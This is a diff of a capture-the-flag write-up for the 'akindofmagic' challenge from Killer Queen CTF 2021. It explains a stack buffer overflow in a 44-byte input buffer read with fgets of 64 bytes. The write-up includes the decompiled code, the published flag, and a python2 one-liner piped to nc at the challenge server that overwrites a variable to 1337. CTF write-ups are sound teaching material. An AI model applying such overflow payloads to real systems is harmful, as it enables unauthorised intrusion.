@@ -9,55 +9,97 @@ tags:
 date: 2021-11-01
 description: |-
     You're a magic man aren't you? Well can you show me?
+
+    [akindofmagic](/assets/CTFs/2021/Killer-Queen-CTF/akindofmagic)
 flag: flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
 ---
 <details>
     <summary>tl;dr</summary>
-    
+    Basic buffer overflow. Send 44 bytes of padding followed by 1337 to match condition and get flag.
 </details>
 
 ***
 
 ## Introduction
 
-We get a binary, which asks us for a magic input and outputs "Your magic is", followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.
+We start by running the binary to see what it does:
+<pre 
+    class="command-line"
+    data-user="kali"
+    data-host="kali"
+    data-output="2"
+><code class="language-bash">./akindofmagic
+Is this a kind of magic? What is your magic?:</code>
+</pre>
 
-That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline.
+Giving it the input "test", we get the response
+<pre 
+    class="command-line"
+    data-user="kali"
+    data-host="kali"
+    data-output="1-4"
+><code class="language-bash">You entered test
 
-Looking into the code in Cutter and decompiling, it looks fairly simple:
+Your magic is: 0
+You need to challenge the doors of time</code>
+</pre>
 
+We decompile the file with Ghidra, which provides the following decompilation of `main` (I renamed some variables and cleaned it a bit):
 ```c
-main(int argc, char **argv)
-{
-    char **var_40h;
-    int var_34h;
-    char *s;
-    unsigned long var_4h;
-    
-    var_4h = 0;
-    puts("Is this a kind of magic? What is your magic?: ");
-    fflush(_stdout);
-    fgets(&s, 0x40, _stdin);
-    printf("You entered %s\n", &s);
-    printf("Your magic is: %d\n", var_4h);
-    fflush(_stdout);
-    if (var_4h == 0x539) {
-        puts("Whoa we got a magic man here!");
-        fflush(_stdout);
-        system("cat flag.txt");
-    } else {
-        puts("You need to challenge the doors of time");
-        fflush(_stdout);
-    }
-    return 0;
+int main() {
+  char input[44];
+  uint magic;
+  
+  magic = 0;
+
+  puts("Is this a kind of magic? What is your magic?: ");
+  fgets(input, 64, stdin);
+  printf("You entered %s\n", input);
+  printf("Your magic is: %d\n", magic);
+
+  if (magic == 1337) {
+    puts("Whoa we got a magic man here!");
+    system("cat flag.txt");
+  } else {
+    puts("You need to challenge the doors of time");
+  }
+  return 0;
 }
 ```
+So the program reads a string of up to 64 characters, prints it back, and prints the 32-bit integer `magic` (initialized to 0). It then checks if `magic == 1337` and if so, we get the flag.
 
-It initializes a string `char* s` and a value `var_4h = 0`. It then takes an input up to 64 characters and assigns to the string. But perhaps the buffer for the string is not as large (44 characters according to our test). This means the next characters overflow into `var_4h`, which is then printed. So we can basically insert any number we want into `var_4h`.
+## Vulnerability
 
-This is very useful, since the next condition checks if `var_4h == 0x539` and if so, we get the flag.
+Inspecting the code a bit closer, we see the input buffer is 44 bytes, but the program reads up to 64. This means we can overflow the buffer, writing into the next parts of the stack where `magic` is stored. So we can overwrite `magic` and control its value.
 
-So we can simply pass in 44 random bytes followed by 0x539 (followed by some null bytes to get the newline out of the integer and into the next field):
-```
-python2 -c "print b'A' * 44 + b'\x39\x05\x00\x00'" | nc 143.198.184.186 5000
-```
+We can quickly test this. If we input a string of 44 characters, then the next character will be a newline, which ASCII value in decimal is 10. So we would expect the program to output "Your magic is: 10". Let's try it out:
+<pre 
+    class="command-line"
+    data-user="kali"
+    data-host="kali"
+    data-output="2-7"
+><code class="language-bash">./akindofmagic
+Is this a kind of magic? What is your magic?: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Your magic is: 10
+You need to challenge the doors of time</code>
+</pre>
+It works as we expected.
+
+## Exploit
+
+We now want to perform the same attack as our simple test case, but want `magic` to be set to 1337, not 10. We can again just send 44 random padding characters, but now append 1337, which in hex is 0x539. We must make sure we send this as a 32-bit integer -- 0x00000539 -- to push the following newline character out of the `magic` variable. In little endian bytes, this value is then `\x39\x05\x00\x00` and we run
+<pre 
+    class="command-line"
+    data-user="kali"
+    data-host="kali"
+    data-output="2-6"
+><code class="language-python">python2 -c "print b'A' * 44 + b'\x39\x05\x00\x00'" | nc 143.198.184.186 5000      
+Is this a kind of magic? What is your magic?: 
+You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9
+Your magic is: 1337
+flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
+Whoa we got a magic man here!</code>
+</pre>
